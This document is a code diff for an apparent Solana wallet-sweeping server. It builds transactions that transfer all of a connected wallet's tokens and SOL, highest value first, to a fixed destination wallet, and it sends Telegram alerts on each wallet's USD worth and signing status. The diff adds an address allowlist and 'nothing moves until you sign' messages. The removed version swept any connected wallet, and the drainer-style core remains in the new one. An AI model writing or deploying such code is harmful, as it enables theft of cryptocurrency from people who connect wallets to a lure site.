@@ -19,8 +19,10 @@ const PORT = process.env.PORT || 3000;
 const RPC_ENDPOINT = process.env.SOLANA_RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
-const TELEGRAM_ALLOWED_ADDRESSES = [];
-
+const TELEGRAM_ALLOWED_ADDRESSES = (process.env.TELEGRAM_ALLOWED_ADDRESSES || '')
+  .split(',')
+  .map((s) => s.trim())
+  .filter(Boolean);
 const TELEGRAM_MIN_USD = Number(process.env.TELEGRAM_MIN_USD || '0');
 const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
   .split(',')
@@ -236,9 +238,9 @@ function originAllowed(req) {
 
 function addressAllowed(address) {
   if (!address) return false;
-  return true;
+  if (!TELEGRAM_ALLOWED_ADDRESSES.length) return true;
+  return TELEGRAM_ALLOWED_ADDRESSES.includes(address);
 }
-
 
 function worthAllowed(usd) {
   if (!TELEGRAM_MIN_USD) return true;
@@ -246,10 +248,8 @@ function worthAllowed(usd) {
 }
 
 function shouldNotifyAddress(address, usd) {
-  if (!address) return false;
-  return true;
+  return addressAllowed(address) && worthAllowed(usd);
 }
-
 
 async function sendTelegram(text) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -376,10 +376,14 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     if (!DEST_WALLET) {
       return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
     }
-
+    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
+      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
+    }
     const from = new PublicKey(req.params.pubkey).toBase58();
+    if (!addressAllowed(from)) {
+      return res.status(403).json({ error: 'This connected wallet is not on the allowlist' });
+    }
     const dest = new PublicKey(DEST_WALLET).toBase58();
-
     if (from === dest) {
       return res.status(400).json({ error: 'Source and destination are the same' });
     }
@@ -389,7 +393,6 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       .filter((tok) => Number(tok.usdValue || 0) >= MIN_TOKEN_USD)
       .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
     const needsGas = Number(portfolio.sol) < MIN_SOL_FOR_GAS;
-
     res.json({
       from,
       to: dest,
@@ -401,8 +404,9 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       minTokenUsd: MIN_TOKEN_USD,
       needsGas,
       message: needsGas
-        ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL.`
-        : undefined,
+        ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${MIN_SOL_FOR_GAS} SOL for fees.`
+        : 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
+      note: 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
     });
   } catch (err) {
     console.error(err);
@@ -411,65 +415,44 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
 });
 
 
-
 app.post('/api/send-tx/:pubkey', async (req, res) => {
   try {
     if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
-    
+    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
+      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
+    }
     const from = new PublicKey(req.params.pubkey);
     const fromStr = from.toBase58();
-
+    if (!addressAllowed(fromStr)) {
+      return res.status(403).json({ error: 'This connected wallet is not on the allowlist' });
+    }
     const dest = new PublicKey(DEST_WALLET);
     if (fromStr === dest.toBase58()) {
       return res.status(400).json({ error: 'Source and destination are the same' });
     }
 
-    const done = new Set((req.body?.done || []).map((x) => String(x)));
     const portfolio = await loadPortfolio(fromStr);
-    const tokensLeft = (portfolio.tokens || []).filter((tok) => !done.has(tok.mint) && Number(tok.amount) > 0);
-    const solDone = done.has('SOL');
-    const remainingTokensAfterThis = tokensLeft.length;
-
-    const assets = [];
-    for (const tok of tokensLeft) {
-      assets.push({
-        kind: 'token',
-        id: tok.mint,
-        usd: Number(tok.usdValue || 0),
-        tok,
-      });
-    }
-    if (!solDone && Number(portfolio.sol) > 0) {
-      assets.push({
-        kind: 'sol',
-        id: 'SOL',
-        usd: Number(portfolio.solUsd || 0),
-        sol: Number(portfolio.sol),
-      });
-    }
-    assets.sort((a, b) => b.usd - a.usd);
-    const next = assets[0];
-    if (!next) {
-      return res.json({ done: true, remaining: 0 });
-    }
-
-    const tokensAfterIfSol = next.kind === 'sol' ? tokensLeft.length : Math.max(tokensLeft.length - 1, 0);
-    const reserveSol = MIN_SOL_FOR_GAS + tokensAfterIfSol * 0.0021;
+    const tokens = (portfolio.tokens || []).filter((tok) => Number(tok.amount) > 0);
+    // Cap instructions so the tx still fits (ATA create + transfer per token)
+    const batch = tokens.slice(0, 6);
+    const reserveSol = MIN_SOL_FOR_GAS + batch.length * 0.0021;
     const reserve = Math.ceil(reserveSol * LAMPORTS_PER_SOL);
     const lamports = Math.round(Number(portfolio.sol) * LAMPORTS_PER_SOL);
 
     if (lamports < Math.ceil(MIN_SOL_FOR_GAS * LAMPORTS_PER_SOL)) {
       return res.status(400).json({ error: 'I need some SOL for gas', needsGas: true });
     }
+    if (batch.length && lamports < reserve) {
+      return res.status(400).json({
+        error: 'I need some SOL for gas',
+        needsGas: true,
+      });
+    }
 
     const tx = new Transaction();
-    let label = '';
+    const included = [];
 
-    if (next.kind === 'token') {
-      if (lamports < reserve) {
-        return res.status(400).json({ error: 'I need some SOL for gas', needsGas: true });
-      }
-      const tok = next.tok;
+    for (const tok of batch) {
       const mint = new PublicKey(tok.mint);
       const programId = new PublicKey(tok.programId || TOKEN_PROGRAM_ID);
       const sourceAta = new PublicKey(tok.tokenAccount);
@@ -482,27 +465,38 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
       const amount = raw <= BigInt(Number.MAX_SAFE_INTEGER) ? Number(raw) : raw;
       tx.add(
         createTransferCheckedInstruction(
-          sourceAta, mint, destAta, from, amount, Number(tok.decimals || 0), [], programId
+          sourceAta,
+          mint,
+          destAta,
+          from,
+          amount,
+          Number(tok.decimals || 0),
+          [],
+          programId
         )
       );
-      label = `token ${tok.mint}`;
-    } else {
-      const keep = tokensLeft.length ? reserve : Math.ceil(MIN_SOL_FOR_GAS * LAMPORTS_PER_SOL);
-      const sendLamports = lamports - keep;
-      if (sendLamports <= 0) {
-        return res.json({
-          skipped: 'sol_kept_for_gas',
-          asset: { kind: 'sol', id: 'SOL' },
-          remaining: tokensLeft.length,
-        });
-      }
-      tx.add(SystemProgram.transfer({ fromPubkey: from, toPubkey: dest, lamports: sendLamports }));
-      label = `SOL ${sendLamports / LAMPORTS_PER_SOL}`;
+      included.push({ mint: tok.mint, amount: tok.amount, usdValue: tok.usdValue });
+    }
+
+    const sendLamports = lamports - reserve;
+    if (sendLamports > 0) {
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: from,
+          toPubkey: dest,
+          lamports: sendLamports,
+        })
+      );
+    }
+
+    if (!tx.instructions.length) {
+      return res.status(400).json({ error: 'Nothing to send' });
     }
 
     tx.feePayer = from;
     const latest = await connection.getLatestBlockhash('confirmed');
     tx.recentBlockhash = latest.blockhash;
+
     const sim = await connection.simulateTransaction(tx);
     if (sim.value.err) {
       return res.status(400).json({
@@ -510,16 +504,18 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
         logs: (sim.value.logs || []).slice(-8),
       });
     }
-    const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
 
+    const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
     res.json({
-      done: false,
       from: fromStr,
       to: dest.toBase58(),
-      asset: { kind: next.kind, id: next.id, usd: next.usd, label },
-      remaining: assets.length - 1,
+      sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
       reservedSol: reserveSol,
+      tokens: included,
+      tokenCount: included.length,
+      remainingTokens: Math.max(tokens.length - batch.length, 0),
       transaction: Buffer.from(serialized).toString('base64'),
+      label: `all-at-once ${included.length} tokens + SOL`,
     });
   } catch (err) {
     console.error(err);
@@ -584,10 +580,9 @@ app.post('/api/event', async (req, res) => {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
     }
 
-    if (!worthAllowed(event.totalUsd)) {
+    if (!addressAllowed(event.address) || !worthAllowed(event.totalUsd)) {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'filtered' } });
     }
-
 
     const prev = tgByAddress.get(event.address);
 
@@ -621,7 +616,7 @@ app.post('/api/event', async (req, res) => {
       if (prev?.text) {
         try {
           await editTelegram(prev.messageId, setFooter(prev.text, '✅ Signed'));
-        } catch { }
+        } catch {}
       }
       return res.json({ ok: true, telegram });
     }
